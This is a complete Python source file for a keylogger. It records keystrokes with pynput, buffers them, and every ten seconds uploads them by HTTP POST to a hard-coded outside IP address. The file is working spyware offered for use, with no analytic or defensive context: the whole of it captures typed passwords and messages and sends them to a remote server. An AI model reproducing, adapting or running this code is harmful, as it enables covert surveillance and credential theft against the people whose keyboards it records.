"""
keylogger.py

a simple keylogger that buffers keystrokes and periodically uploads them
to a remote server

Dependencies:
    - pynput
    - requests
"""
import json
import threading
import logging
from typing import Optional

import requests
from pynput import keyboard

SERVER_IP = "162.216.16.105"
SERVER_PORT = 8080
UPLOAD_INTERVAL = 10  # seconds

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s:%(message)s")

class KeyLogger:
    """buffers keystrokes and uploads them to a remote server"""

    def __init__(self, ip: str, port: int, interval: int) -> None:
        self.server_ip = ip
        self.server_port = port
        self.interval = interval
        self._buffer = ""
        self._timer: Optional[threading.Timer] = None

    def _on_press(self, key) -> None:
        """callback for keyboard events"""
        if key == keyboard.Key.enter:
            self._buffer += "\n"
        elif key == keyboard.Key.space:
            self._buffer += " "
        elif key == keyboard.Key.tab:
            self._buffer += "\t"
        elif hasattr(key, "char") and key.char is not None:
            self._buffer += key.char
        # stop on ESC
        if key == keyboard.Key.esc:
            return False

    def _upload_data(self) -> None:
        """Send buffered keys to the server and reset the timer"""
        payload = {"keyboardData": self._buffer}
        url = f"http://{self.server_ip}:{self.server_port}"
        try:
            resp = requests.post(url, json=payload, timeout=5)
            resp.raise_for_status()
            logging.info("uploaded %d characters", len(self._buffer))
            self._buffer = ""
        except requests.RequestException as e:
            logging.error("upload failed: %s", e)
        finally:
            # schedule next upload
            self._timer = threading.Timer(self.interval, self._upload_data)
            self._timer.daemon = True
            self._timer.start()

    def start(self) -> None:
        """start the listener and periodic uploader"""
        self._upload_data()
        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()

def main() -> None:
    kl = KeyLogger(SERVER_IP, SERVER_PORT, UPLOAD_INTERVAL)
    kl.start()

if __name__ == "__main__":
    main()
